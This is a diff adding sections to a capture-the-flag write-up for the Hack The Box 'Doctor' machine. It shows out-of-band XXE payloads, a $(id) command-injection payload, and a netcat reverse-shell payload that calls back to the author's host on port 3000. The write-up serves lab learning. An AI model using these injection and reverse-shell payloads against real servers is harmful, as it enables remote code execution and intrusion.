@@ -126,7 +126,23 @@ http://doctors.htb/server-status        (Status: 403) [Size: 276]
 Exploring http://doctors.htb/register, we discover a sign up page to register a user to login to the site. However, we realize that the user will only be valid for 20mins. 
 
 ![Sign up page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/signup.png)
+
+On the /home page, we realize that we are able to create a new post, and the creation of this new post will be reflected on our /archive page.
+
+![Creating new post](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/new_post.png)
+
+![Page archive](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/archive.png)
+
+Looking at the response at /archive, I figured out that the website might be vulnerable to an XXE injection, and decided to try an OOB XXE injection using the payload ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/test"> ]>```
+
+![XXE Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/xxe_injection.png)
+
+Next, we will try to do a code injection by modifying the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(id)"> ]>``` and the output is reflected on our server
+
+![code injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/code_injection.png)
 ## Exploit
 ### Obtaining reverse shell
+
+To obtain a reverse shell, we can modify the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(nc.traditional$IFS-c$IFS/bin/bash$IFS'10.10.16.5'$IFS'3000')"> ]>```
 ### Obtaining user flag
 ### Obtaining root flag
